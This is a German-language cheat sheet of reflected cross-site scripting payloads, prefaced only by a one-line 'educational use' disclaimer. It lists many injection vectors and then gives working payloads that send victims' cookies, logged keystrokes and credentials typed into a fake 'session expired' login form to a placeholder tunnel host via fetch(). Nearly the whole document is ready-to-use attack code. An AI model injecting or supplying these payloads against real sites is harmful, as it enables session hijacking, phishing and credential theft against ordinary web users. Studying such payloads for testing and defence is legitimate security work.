# Reflected XSS Payloads

**NUR FÜR BILDUNGSZWECKE IN KONTROLLIERTEN UMGEBUNGEN!**

---

## Teil 1: Basis Payloads (ohne Server)

### 1.1 IMG-Tag Payloads

**Alert Box**
```html
<img src=x onerror="alert('XSS')">
```

**Cookie anzeigen**
```html
<img src=x onerror="alert(document.cookie)">
```

**Redirect (z.B. zu Amazon)**
```html
<img src=x onerror="window.location='https://amazon.com'">
```

**Fake Login-Form**
```html
<img src=x onerror="document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.1)\"><h2 style=\"text-align:center\">Login</h2><form onsubmit=\"alert(document.getElementById(\'e\').value+\' \'+document.getElementById(\'p\').value);return false\"><input id=\"e\" type=\"email\" placeholder=\"E-Mail\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><input id=\"p\" type=\"password\" placeholder=\"Passwort\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><button type=\"submit\" style=\"width:100%;background:#000;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer\">Login</button></form></div>'">
```

**Keylogger (Console)**
```html
<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;console.log('KEYS:'+k)}">
```

### 1.2 Alternative XSS-Techniken (zeigen dass XSS nicht nur mit IMG funktioniert!)

**Script-Tag (klassisch)**
```html
<script>alert('XSS')</script>
```

**SVG mit onload**
```html
<svg onload="alert('XSS')">
```

**SVG mit Cookie-Diebstahl**
```html
<svg onload="alert(document.cookie)">
```

**Input mit autofocus**
```html
<input autofocus onfocus="alert('XSS')">
```

**Body-Tag mit onload**
```html
<body onload="alert('XSS')">
```

**IFRAME mit javascript:**
```html
<iframe src="javascript:alert('XSS')">
```

**Link mit javascript:**
```html
<a href="javascript:alert('XSS')">Klick mich</a>
```

**Video mit onerror**
```html
<video src=x onerror="alert('XSS')">
```

**Details-Tag mit ontoggle**
```html
<details open ontoggle="alert('XSS')">
```

**Marquee mit onstart**
```html
<marquee onstart="alert('XSS')">Text</marquee>
```

---


### Cookie-Diebstahl (Basic)
```html
<script>fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie)</script>
```

**Kompakte Version (IMG-Tag):**
```html
<img src=x onerror="fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie)">
```

**Mit zusätzlichen Infos:**
```html
<script>
fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie+'&url='+window.location.href+'&time='+Date.now())
</script>
```

---

### Keylogger mit Server
```html
<script>
var k='';
document.onkeydown=function(e){
  k+=e.key;
  if(k.length>20){
    fetch('https://YOUR_TUNNELMOLE_URL/keys?data='+encodeURIComponent(k)+'&url='+location.href);
    k='';
  }
}
</script>
```

**Kompakte IMG-Version:**
```html
<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;if(k.length>20){fetch('https://YOUR_TUNNELMOLE_URL/keys?data='+encodeURIComponent(k));k=''}}">
```

---

### Cookie-Diebstahl + Phishing Login
```html
<script>
// Cookies stehlen
fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie);

// Fake Login anzeigen
document.body.innerHTML='<div style="max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.1)"><h2 style="text-align:center">Sitzung abgelaufen - Bitte erneut anmelden</h2><form onsubmit="fetch(\'https://YOUR_TUNNELMOLE_URL/phishing?email=\'+document.getElementById(\'e\').value+\'&pass=\'+document.getElementById(\'p\').value);alert(\'Login erfolgreich!\');return false"><input id="e" type="email" placeholder="E-Mail" required style="width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px"><input id="p" type="password" placeholder="Passwort" required style="width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px"><button type="submit" style="width:100%;background:#000;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer">Anmelden</button></form></div>';
</script>
```

---

### Cookie-Diebstahl + Keylogger (Kombination)
```html
<script>
// Cookies sofort stehlen
fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie);

// Keylogger installieren
var k='';
document.onkeydown=function(e){
  k+=e.key;
  if(k.length>15){
    fetch('https://YOUR_TUNNELMOLE_URL/keys?data='+encodeURIComponent(k)+'&url='+location.href);
    k='';
  }
}
</script>
```

---
